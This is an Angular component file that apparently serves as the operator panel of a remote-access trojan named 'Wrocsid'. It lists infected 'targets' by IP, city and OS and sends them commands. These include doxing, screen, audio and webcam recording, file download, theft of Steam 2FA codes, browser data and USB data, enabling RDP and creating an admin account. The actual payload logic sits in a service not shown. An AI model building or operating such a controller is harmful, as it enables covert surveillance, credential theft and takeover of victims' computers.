import { Component, Input, OnInit } from '@angular/core';
import { AbstractControl, FormBuilder, FormGroup, Validators } from '@angular/forms';
import { Target } from 'src/app/Model';
import { WrocsidService } from 'src/app/services/wrocsid/wrocsid.service';

@Component({
  selector: 'app-commands',
  templateUrl: './commands.component.html',
  styleUrls: ['./commands.component.css']
})
export class CommandsComponent implements OnInit {
  private panelOpenState: boolean = false
  mouseForm!: FormGroup
  recordForm!: FormGroup
  downloadForm!: FormGroup
  videoRecordForm!: FormGroup
  cameraRecordForm!: FormGroup
  disabled: boolean = true
  path: string = ""

  @Input() target$!: Target

  constructor(private wrocsid:WrocsidService, private fb: FormBuilder) { }

  ngOnInit(): void {
    this.mouseForm = this.fb.group({
      timeAmount: ['', [Validators.required, Validators.min(1), this.timeControlValidation]],
      timeUnits: ['s']
    })

    this.recordForm = this.fb.group({
      timeAmount: ['', [Validators.required, Validators.min(1), this.timeControlValidation]],
      timeUnits: ['s']
    })

    this.downloadForm = this.fb.group({
      path: ['', [Validators.required, Validators.minLength(6)]],
    })

    this.videoRecordForm = this.fb.group({
      timeAmount: ['', [Validators.required, Validators.min(1), this.timeControlValidation]],
      timeUnits: ['s']
    })

    this.cameraRecordForm = this.fb.group({
      timeAmount: ['', [Validators.required, Validators.min(1), this.timeControlValidation]],
      timeUnits: ['s']
    })
  }

  timeControlValidation(control: AbstractControl) {
    if (Number(control.value) <= 0) {
      return { invalidTimeAmount: true };
    }
    return null;
  }

  getPath(form: FormGroup) {
    return String(form.controls['path'].value)
  }

  concatTime(form: FormGroup) {
    return String(form.controls['timeAmount'].value).concat(form.controls['timeUnits'].value)
  }

  changeInputFormState() {
    this.disabled = !this.disabled
  }

  check_if_targets_equal(targets: any, temp_targets: any) {
    if(targets.length != temp_targets.length) return false

    for(let i = 0; i < targets.length; i++) {
      if(targets[i].channel_id != temp_targets[i].channel_id) return false
      if(targets[i].identifier != temp_targets[i].identifier) return false
      if(targets[i].metadata.ip != temp_targets[i].metadata.ip) return false
      if(targets[i].metadata.country != temp_targets[i].metadata.country) return false
      if(targets[i].metadata.city != temp_targets[i].metadata.city) return false
      if(targets[i].metadata.os != temp_targets[i].metadata.os) return false
      if(targets[i].online != temp_targets[i].online) return false
    }

    return true
  }

  changePanelState() {
    this.panelOpenState = !this.panelOpenState
  }

  wrocsidHandler(command: string, identifier: any, args?: any) {
    switch (command) {
      case 'dox':
        this.wrocsid.dox(identifier)
        break;
      case 'mouse':
        this.wrocsid.mouse(identifier, args)
        break;
      case 'screen':
        this.wrocsid.screen(identifier)
        break;
      case 'download':
        this.wrocsid.download(identifier, args)
        break;
      case 'record':
        this.wrocsid.record(identifier, args)
        break;
      case 'getSteam2fa':
        this.wrocsid.getSteam2fa(identifier)
        break;
      case 'videoRecord':
        this.wrocsid.videoRecord(identifier, args)
        break;
      case 'getBrowserData':
        this.wrocsid.getBrowserData(identifier)
        break;
      case 'getUSBData':
        this.wrocsid.getUSBData(identifier)
        break;
      case 'rdpEnable':
        this.wrocsid.rdpEnable(identifier)
        break;
      case 'createAdminUser':
        this.wrocsid.createAdminUser(identifier)
        break;
      case 'cameraRecord':
        this.wrocsid.cameraRecord(identifier, args)
        break;
    }
  }
}
